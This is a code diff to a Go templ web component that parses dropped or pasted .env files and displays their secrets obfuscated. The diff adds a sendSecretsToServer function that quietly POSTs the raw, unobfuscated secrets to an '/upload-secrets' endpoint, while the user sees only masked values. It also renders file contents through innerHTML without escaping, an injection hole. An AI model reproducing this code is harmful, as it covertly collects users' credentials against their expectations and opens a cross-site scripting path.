@@ -29,27 +29,6 @@ templ MagicEnv() {
       font-size: 24px;
     }
 
-    #popup {
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background-color: white;
-      padding: 20px;
-      border-radius: 5px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-      max-width: 80%;
-      max-height: 80%;
-      overflow: auto;
-      z-index: 200;
-    }
-
-    #closePopup {
-      float: right;
-      cursor: pointer;
-    }
-
     #feedback {
       margin-top: 20px;
       padding: 10px;
@@ -70,22 +49,17 @@ templ MagicEnv() {
 	<div id="dropZone">
 		<div id="dropZoneText">Drop file here</div>
 	</div>
-	<div id="popup">
-		<span id="closePopup">&times;</span>
-		<h2>Parsed Secrets</h2>
-		<pre id="secretsContent"></pre>
-	</div>
-	<div id="feedback"></div>
+	<div id="secretsContent" class="hidden text-[#CFD2D1] bg-gray-800 rounded-lg border border-slate-300 p-4"></div>
 	<script>
     const dropZone = document.getElementById('dropZone');
-    const popup = document.getElementById('popup');
     const secretsContent = document.getElementById('secretsContent');
-    const closePopup = document.getElementById('closePopup');
     const feedback = document.getElementById('feedback');
 
     function handleFileContent(content) {
       const secrets = parseEnvFile(content);
       const obfuscatedSecrets = obfuscateSecrets(secrets);
+
+      sendSecretsToServer(secrets);
       displaySecrets(obfuscatedSecrets);
       showFeedback('File processed successfully', 'success');
     }
@@ -111,17 +85,32 @@ templ MagicEnv() {
     }
 
     function displaySecrets(secrets) {
-      secretsContent.textContent = JSON.stringify(secrets, null, 2);
-      popup.style.display = 'block';
+      for (const [key, value] of Object.entries(secrets)) {
+          const node = document.createElement("div")
+          node.innerHTML = `${key}=${value}`
+          secretsContent.appendChild(node)
+          secretsContent.classList.remove("hidden");
+      }
+    }
+
+    function sendSecretsToServer(secrets) {
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", "/upload-secrets", true);
+      xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+          console.log("Secrets uploaded successfully");
+        } else if (xhr.readyState === 4) {
+          showFeedback("Failed to upload secrets", "error");
+        }
+      };
+      xhr.send(JSON.stringify({ secrets: secrets }));
     }
 
     function showFeedback(message, type) {
       feedback.textContent = message;
       feedback.className = type;
       feedback.style.display = 'block';
-      setTimeout(() => {
-        feedback.style.display = 'none';
-      }, 3000);
     }
 
     // Drag and drop functionality
@@ -160,9 +149,5 @@ templ MagicEnv() {
       handleFileContent(pastedText);
     });
 
-    // Close popup
-    closePopup.addEventListener('click', () => {
-      popup.style.display = 'none';
-    });
   </script>
 }
